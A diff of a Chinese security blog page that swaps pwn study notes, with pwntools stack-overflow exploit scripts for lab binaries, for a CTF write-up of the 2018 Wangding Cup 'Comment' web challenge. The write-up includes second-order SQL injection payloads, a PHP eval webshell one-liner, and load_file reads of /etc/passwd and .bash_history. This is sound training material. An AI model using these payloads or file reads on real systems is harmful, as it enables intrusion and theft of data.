@@ -15,26 +15,32 @@
 
 
 
-<meta name="description" content="某年某日,应队伍缺pwn,故学习于ctf-wiki.学其有感,写文以记之。">
+<meta name="description" content="在家无聊在buu刷到2018网鼎杯的Comment，发现有好几个点正好是的我目前比较薄弱的故写文以记之.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="学习pwn小记(1)">
-<meta property="og:url" content="lexsd6.github.io/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/index.html">
+<meta property="og:title" content="网鼎杯 2018-Comment  复现笔记">
+<meta property="og:url" content="lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/index.html">
 <meta property="og:site_name" content="lexsd6&#39;s home">
-<meta property="og:description" content="某年某日,应队伍缺pwn,故学习于ctf-wiki.学其有感,写文以记之。">
+<meta property="og:description" content="在家无聊在buu刷到2018网鼎杯的Comment，发现有好几个点正好是的我目前比较薄弱的故写文以记之.">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="lexsd6.github.io/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/image-20200909214148691.png">
-<meta property="og:image" content="lexsd6.github.io/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/image-20200911231138664.png">
-<meta property="og:image" content="lexsd6.github.io/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/image-20200911220549058.png">
-<meta property="og:image" content="lexsd6.github.io/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/image-20200911110700992.png">
-<meta property="og:image" content="lexsd6.github.io/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/image-20200911223653876.png">
-<meta property="og:image" content="lexsd6.github.io/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/image-20200912105057908.png">
-<meta property="og:image" content="lexsd6.github.io/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/image-20200912115324139.png">
-<meta property="article:published_time" content="2020-09-09T13:11:47.145Z">
-<meta property="article:modified_time" content="2020-09-12T10:17:37.481Z">
+<meta property="og:image" content="lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20210215220051579.png">
+<meta property="og:image" content="lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20210215222444037.png">
+<meta property="og:image" content="lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20210215222731749.png">
+<meta property="og:image" content="lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20210215233502014.png">
+<meta property="og:image" content="lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20210216000155737.png">
+<meta property="og:image" content="lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20210216000223139.png">
+<meta property="og:image" content="lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20210216000257110.png">
+<meta property="og:image" content="lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20210215231823859.png">
+<meta property="og:image" content="lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20210216110435524.png">
+<meta property="og:image" content="lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20210216000357240.png">
+<meta property="article:published_time" content="2021-02-15T10:10:28.605Z">
+<meta property="article:modified_time" content="2021-02-16T03:54:51.771Z">
 <meta property="article:author" content="lexsd6">
-<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="sql">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="lexsd6.github.io/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/image-20200909214148691.png">
+<meta name="twitter:image" content="lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20210215220051579.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -68,7 +74,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>学习pwn小记(1) | lexsd6&#39;s home</title>
+<title>网鼎杯 2018-Comment  复现笔记 | lexsd6&#39;s home</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -268,11 +274,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-学习pwn小记(1)" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-网鼎杯 2018-Comment  复现笔记" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/" class="article-date">
-      <time datetime="2020-09-09T13:11:47.145Z" itemprop="datePublished">2020-09-09</time>
+      <a href="/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/" class="article-date">
+      <time datetime="2021-02-15T10:10:28.605Z" itemprop="datePublished">2021-02-15</time>
 </a>
 
 
@@ -287,7 +293,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      学习pwn小记(1)
+      网鼎杯 2018-Comment  复现笔记
     </h1>
   
 
@@ -302,7 +308,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/" rel="tag">sql</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -312,76 +318,67 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>某年某日,应队伍缺pwn,故学习于ctf-wiki.学其有感,写文以记之。</p>
-<a id="more"></a>
+        <p>在家无聊在buu刷到2018网鼎杯的Comment，发现有好几个点正好是的我目前比较薄弱的故写文以记之.<a id="more"></a></p>
+<h2 id="0x01过程步骤"><a href="#0x01过程步骤" class="headerlink" title="0x01过程步骤"></a>0x01过程步骤</h2><p>、进入题目，发现是一个帖子论坛网站。发现有疑似sql注入的注入点。但是测试后没有发现明显的利用点，就没有什么思绪。尝试访问几个常见文件或目录名，发现有git泄露。</p>
+<p><img src="image-20210215220051579.png" alt="image-20210215220051579"></p>
+<p>用githack获得源文件。</p>
+<p><img src="image-20210215222444037.png" alt="image-20210215222444037"></p>
+<p>经过审计发现有疑似，二次注入的可能。</p>
+<p><img src="image-20210215222731749.png" alt="image-20210215222731749"></p>
+<p>由于addslashes会将一些符号转义但是在sql转义的符号在储存后与addslashes前并没有什么改变（换句话说<code>\&#39;</code>在存入sql后，读取出来仍会是<code>&#39;</code>）。所有我们可以写入数据，再通过这一特性将<code>&#39;</code>逃逸出来，即二次注入。</p>
+<p>因此我们可以构造paylaod：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&#39;,(select database()),x&#x3D;1&#x2F;*</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure>
 
-<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。</p>
-<p><img src="image-20200909214148691.png" alt="image-20200909214148691"></p>
-<p>如图，想要利用触发栈溢出程序必须向<strong>栈上写入数据</strong>和<strong>写入的数据大小没有被良好地控制</strong></p>
-<h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><h4 id="关于输入的危险函数"><a href="#关于输入的危险函数" class="headerlink" title="关于输入的危险函数"></a>关于输入的危险函数</h4><p>​    gets()，直接读取一行，忽略’\x00’<br>​            scanf()<br>​            vscanf()</p>
-<h4 id="关于输出的危险函数"><a href="#关于输出的危险函数" class="headerlink" title="关于输出的危险函数"></a>关于输出的危险函数</h4><p>   sprintf()</p>
-<h4 id="关于字符串操作的危险函数"><a href="#关于字符串操作的危险函数" class="headerlink" title="关于字符串操作的危险函数"></a>关于字符串操作的危险函数</h4><p>​    strcpy，字符串复制，遇到’\x00’停止<br>​            strcat，字符串拼接，遇到’\x00’停止<br>​            bcopy</p>
-<h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p>
-<ul>
-<li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li>
-<li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li>
-<li>直接地址索引，就相当于直接给定了地址。</li>
-</ul>
-<p>一般来说，我们会有如下的覆盖需求</p>
-<ul>
-<li>覆盖函数返回地址，这时候就是直接看 EBP 即可。</li>
-<li>覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。</li>
-<li>覆盖 bss 段某个变量的内容。</li>
-<li>根据现实执行情况，覆盖特定的变量或地址的内容。</li>
-</ul>
-<p>ps：我们覆盖某个地址的目的是为了让程序读取我们覆盖的恶意地址来达到我们的目的，执行我们想要执行的东西。</p>
-<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>emm,这道题保护只开了栈不可执行,对我来说影响深刻的反而是找buf的大小的问题。</p>
-<p><img src="image-20200911231138664.png" alt="image-20200911231138664"></p>
-<p>照着以前对pwn薄弱理解，打开ide看到了：</p>
-<p><img src="image-20200911220549058.png" alt="image-20200911220549058"></p>
-<p>然后照ebp算出的要溢出：0x64+4个（104）字符才能溢出到返回地址。</p>
-<p>但是在gdb出来却是：</p>
-<p><img src="image-20200911110700992.png" alt="image-20200911110700992"></p>
-<p>经过测试要溢出的字符的确是108个。才能覆盖返回地址。</p>
-<p>通过收查资料发现，ebp存储着当前栈帧的栈底的地址是通常作为基址。而变量地址是通过通过ebp和偏移相加减来获取。但esp始终指向栈顶，随栈内数据增加或减少而变。同时ida是IDA是静态调试gdb是动态调试，所以ida计算偏移可能有误差，导致我们通过ebp计算出来有误差。（所以还是最好用动态调试）</p>
-<p>然后就返回地址的问题，这里学到一个新的知识吧，返回0x804864A就可以将/bin/sh传入system执行。（</p>
-<p><img src="image-20200911223653876.png" alt="image-20200911223653876"></p>
-<p>然后溢出大小控制了返回地址也确定了，这题就好做了。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./ret2text'</span>)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">108</span>+<span class="string">'bbbb'</span>+p32(<span class="number">0x0804863A</span>) </span><br><span class="line"><span class="comment">#pay='a'*108+'bbbb'+p32(e.got['system'])+p32(0)+p32(0x08048763)#这个是调用system手动传入内置的‘/bin/sh’</span></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>但是这题有个坑的地方，审计源码+测试发现只有 content 字段我们才能利用。</p>
+<p>所有完整payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一包（write.php）</span><br><span class="line">title&#x3D;2&amp;category&#x3D;a&#39;,content&#x3D;(select database()),&#x2F;*&amp;content&#x3D;111</span><br><span class="line">第二包（comment.php）</span><br><span class="line">content&#x3D;*&#x2F;#</span><br></pre></td></tr></table></figure>
 
+<p>这样导致：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">comment</span></span><br><span class="line">            <span class="keyword">set</span> <span class="keyword">category</span> = <span class="string">'$category'</span>,</span><br><span class="line">                <span class="keyword">content</span> = <span class="string">'$content'</span>,</span><br><span class="line">                bo_id = <span class="string">'$bo_id'</span><span class="string">"</span></span><br></pre></td></tr></table></figure>
 
+<p>当$category为<code>a&#39;,content=(select database()),/*</code></p>
+<p>$content为<code>*/#</code>时</p>
+<p>sql语句就变成</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">comment</span></span><br><span class="line">            <span class="keyword">set</span> <span class="keyword">category</span> = <span class="string">'`a'</span>,<span class="keyword">content</span>=(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="comment">/*`',</span></span><br><span class="line"><span class="comment">                content = '*/</span><span class="string">',</span></span><br><span class="line"><span class="string">                bo_id = '</span>$bo_id<span class="string">'"</span></span><br></pre></td></tr></table></figure>
 
-
-
-<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>这道题没有看到system与/bin/sh，但看到nx没防护,在vmap下发现buf有读写执行的能力,所以想要手动写入shell。</p>
-<p><img src="image-20200912105057908.png" alt="image-20200912105057908"></p>
-<p><img src="image-20200912115324139.png" alt="image-20200912115324139"></p>
-<p>于是借着strncpy写入shell</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./ret2shellcode'</span>)</span><br><span class="line">e=ELF(<span class="string">'./ret2shellcode'</span>)</span><br><span class="line">shell=asm(shellcraft.sh())</span><br><span class="line">lang=<span class="number">108</span>+<span class="number">4</span>-len(shell)</span><br><span class="line">pay=shell+<span class="string">'a'</span>*lang+p32(<span class="number">0x0804A080</span>)<span class="comment">#让buf前面是shell，后面是溢出数据，最后是buf地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>这道题,本菜鸡感觉学到两个知识点用系统调用的方法来处理函数和ROPgadget的使用.当我们获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。于是我们可以构造</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;&#x2F;bin&#x2F;sh&quot;,NULL,NULL)</span><br><span class="line">可以理解为调用int 0x80(eax,ebx,ecx,edx)</span><br><span class="line">即：</span><br><span class="line">系统调用号，即 eax 应该为表execve的 0xb</span><br><span class="line">第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</span><br><span class="line">第二个参数，即 ecx 应该为 0</span><br><span class="line">第三个参数，即 edx 应该为 0</span><br><span class="line"></span><br><span class="line">构造payload的框架大体是：</span><br><span class="line">溢出数据 eax地址 eax的值 ebx地址  ebx值  ecx地址 ecx 值 edx 值 edx 值 0x80地址</span><br></pre></td></tr></table></figure>
-
-<p>eax、ebx、ecx、edx这些寄存器可以地址可以用ROPgadget来得到。这里说下ROPgadge是使用</p>
-<p>查找可存储寄存器的地址：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only 'pop|ret' | grep  '寄存器'</span><br><span class="line"><span class="meta">#</span><span class="bash">例</span></span><br><span class="line">ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'</span><br></pre></td></tr></table></figure>
-
-<p>查找某字符串地址：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --string  "字符串“</span><br><span class="line"><span class="meta">#</span><span class="bash">例</span></span><br><span class="line">ROPgadget --binary rop --string "/bin/sh"</span><br></pre></td></tr></table></figure>
-
-
-
-<p>查找有int 0x80的地址：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only 'int'</span><br></pre></td></tr></table></figure>
-
-<p>这样下来payload就容易构造了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./rop'</span>)</span><br><span class="line">e=ELF(<span class="string">'./rop'</span>)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">112</span>+p32(<span class="number">0x080bb196</span>)+p32(<span class="number">0xb</span>)+p32(<span class="number">0x0806eb90</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x080be408</span>)+p32(<span class="number">0x08049421</span>)</span><br><span class="line"><span class="comment">#pay溢出数据+eax地址+eax的值+ebx地址+ebx值+ecx地址+ecx 值 +edx 地址 +edx 值+0x80地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>ps：由于v0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret   ，so先传cdx，ecx，再ebx。</p>
-<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/</a></p>
-<p><a href="https://www.jianshu.com/p/dd5fd511e0d3" target="_blank" rel="noopener">https://www.jianshu.com/p/dd5fd511e0d3</a></p>
+<p>从而产生注入。</p>
+<p><img src="image-20210215233502014.png" alt="image-20210215233502014"></p>
+<p>但通过注入数据库并未得到什么有效信息。所以猜测是否是写入shell或读取文件。</p>
+<p>本想通过<code>select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/a.php&quot;</code>写入shell但未能成功。于是同过load_file函数来读取文件。</p>
+<p>然后又一个问题来了读取什么文件?</p>
+<p>我们尝试读取<code>flag.php</code>、<code>flag.txt</code>、<code>/flag</code>但是发现并未有flag标识。</p>
+<p>思路一下就短路了，在查阅了资料后了解到<code>.bash_history</code>存放了当前用户历史执行命令。但这个文件在当前用户的目录下。因此我们先要读取<code>/etc/pass</code>获取当前用户信息。</p>
+<p><img src="image-20210216000155737.png" alt="image-20210216000155737"></p>
+<p><img src="image-20210216000223139.png" alt="image-20210216000223139"></p>
+<p>然后这里有个小知识点一般下www用户是在web服务部署时专门设置来管理web的用户。</p>
+<p>读取www用户下的<code>.bash_history</code>即访问路径<code>/home/www/.bash_history</code>。</p>
+<p><img src="image-20210216000257110.png" alt="image-20210216000257110"></p>
+<p>看到linux执行过的命令：</p>
+<p>1。跳转到tmp目录</p>
+<p>2。用unzip解压 html.zip ，这时会产生一个html的文件夹</p>
+<p>3。rm 删除了html.zip </p>
+<p>4。cp 将html 文件夹拷贝在 /var/www 目录下</p>
+<p>5。跳转到 /var/html 目录下</p>
+<p>6。删除了<code>.DS_Store</code>文件</p>
+<p>7。启动 web服务</p>
+<p>发现在<code>/var/www/html</code>下的<code>.DS_Store</code>被删除，但是<code>/tmp</code>下的<code>.DS_Store</code>未被删除。读取发现是2进制文件且带有很多<code>\00</code>字符因此用hex转16进制读取。</p>
+<p><img src="image-20210215231823859.png" alt="image-20210215231823859"></p>
+<p>再用winhex读取</p>
+<p><img src="image-20210216110435524.png" alt="image-20210216110435524"></p>
+<p>发现flag_8946e1ff1ee3e40f.php文件。</p>
+<p>在/tmp/html下读取发现是假flag。</p>
+<p>在/var/www/html/下读取到真正flag</p>
+<p><img src="image-20210216000357240.png" alt="image-20210216000357240"></p>
+<h2 id="0x02考点总结"><a href="#0x02考点总结" class="headerlink" title="0x02考点总结"></a>0x02考点总结</h2><h3 id="1-文件泄露"><a href="#1-文件泄露" class="headerlink" title="1.文件泄露"></a>1.文件泄露</h3><p>在本题中考察的是<code>.git</code>文件泄露，我们可以利用githack脚本来恢复历史版本和下载git文件。</p>
+<p>ps：git log -all 恢复历史文件。</p>
+<h3 id="2-sql二次注入"><a href="#2-sql二次注入" class="headerlink" title="2.sql二次注入"></a>2.sql二次注入</h3><p>在本题中，服务器端只对用传来的数据进行了过滤。sql内部的数据为进行过滤。加之<code>\&#39;</code>在存入sql后，读取出来仍会是<code>&#39;</code>。这样<code>‘</code>就逃逸出来。</p>
+<h3 id="3-sql文件读取"><a href="#3-sql文件读取" class="headerlink" title="3.sql文件读取"></a>3.sql文件读取</h3><p>我们可以同过user()来查看当前用户名，若有读权限那么可以通过load_file函数来读取文件。</p>
+<p>同时lunix 下又很多敏感文件，比如：<code>.bash_history</code>存放了历史执行命令、/etc/passwd存放了用户信息、/etc/shadow存放用户密码且一般情况下不可读的。</p>
+<h3 id="4-linux-命令细节"><a href="#4-linux-命令细节" class="headerlink" title="4.linux 命令细节"></a>4.linux 命令细节</h3><p>在本题中考了写linux命令的细节，如cp会保留原文件，unzip 解压时默认在当前路径下生成解压出来的文件。</p>
+<h3 id="5-hexwin-分析hex数据"><a href="#5-hexwin-分析hex数据" class="headerlink" title="5.hexwin 分析hex数据"></a>5.hexwin 分析hex数据</h3><p>我们可以将数据转为16进制再通过hexwin写入文件还原从而获得一些内容特别的文件或数据。</p>
+<h2 id="0x00参考文献"><a href="#0x00参考文献" class="headerlink" title="0x00参考文献"></a>0x00参考文献</h2><p><a href="https://www.jb51.net/article/108979.htm" target="_blank" rel="noopener">https://www.jb51.net/article/108979.htm</a></p>
+<p><a href="https://www.freebuf.com/articles/web/167089.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/167089.html</a></p>
+<p><a href="https://blog.csdn.net/qq_41628669/article/details/106133104" target="_blank" rel="noopener">https://blog.csdn.net/qq_41628669/article/details/106133104</a></p>
 
       
     </div>
@@ -390,13 +387,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/">学习pwn小记(1)</a></p>
+        <p><span>本文标题:</span><a href="/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/">网鼎杯 2018-Comment  复现笔记</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">lexsd6</a></p>
-        <p><span>发布时间:</span>2020-09-09, 21:11:47</p>
-        <p><span>最后更新:</span>2020-09-12, 18:17:37</p>
+        <p><span>发布时间:</span>2021-02-15, 18:10:28</p>
+        <p><span>最后更新:</span>2021-02-16, 11:54:51</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/" title="学习pwn小记(1)">lexsd6.github.io/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/</a>
-            <span class="copy-path" data-clipboard-text="原文: lexsd6.github.io/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/　　作者: lexsd6" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/" title="网鼎杯 2018-Comment  复现笔记">lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/</a>
+            <span class="copy-path" data-clipboard-text="原文: lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/　　作者: lexsd6" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -408,16 +405,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2020/09/10/%E5%AF%B9linux%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%80%BB%E7%BB%93/">
-                    对linux 命令执行的总结
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2020/08/12/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">
-                    关于SQL注入小记
+                <a href="/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/">
+                    关于sql注入bypass总结
                 </a>
             </div>
         
@@ -429,7 +420,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#栈溢出"><span class="toc-text">栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#寻找危险函数"><span class="toc-text">寻找危险函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#关于输入的危险函数"><span class="toc-text">关于输入的危险函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#关于输出的危险函数"><span class="toc-text">关于输出的危险函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#关于字符串操作的危险函数"><span class="toc-text">关于字符串操作的危险函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#确定填充长度"><span class="toc-text">确定填充长度</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2text"><span class="toc-text">ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2shellcode"><span class="toc-text">ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2syscall"><span class="toc-text">ret2syscall</span></a></li><li class="toc-item 